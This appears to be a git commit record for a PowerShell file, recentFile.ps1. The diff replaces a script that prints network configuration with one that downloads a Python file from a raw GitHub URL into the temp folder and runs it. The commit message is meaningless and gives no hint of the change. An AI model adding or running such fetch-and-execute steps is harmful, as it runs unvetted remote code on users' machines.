6e479a88398bb4a480ecd04419e17aaa8754200f
Astronomyc <devastronomyc@outlook.com>
2024-04-06 21:18:57 -0500

    asasdasd

--- recentFile.ps1
+++ recentFile.ps1
@@ -1,3 +1,9 @@
-# Contenido del archivo recentFile.ps1
-Write-Output "Mostrando la configuración de red:"
-ipconfig
+# Descargar el archivo main.py desde la URL
+$pythonScript = irm -Uri "https://raw.githubusercontent.com/astronomyc/filesRecents/main/test.py" -UseBasicParsing
+
+# Guardar el contenido descargado en un archivo temporal
+$tempPath = Join-Path $env:TEMP "main.py"
+$pythonScript | Out-File -FilePath $tempPath -Encoding utf8
+
+# Ejecutar el script Python
+python $tempPath
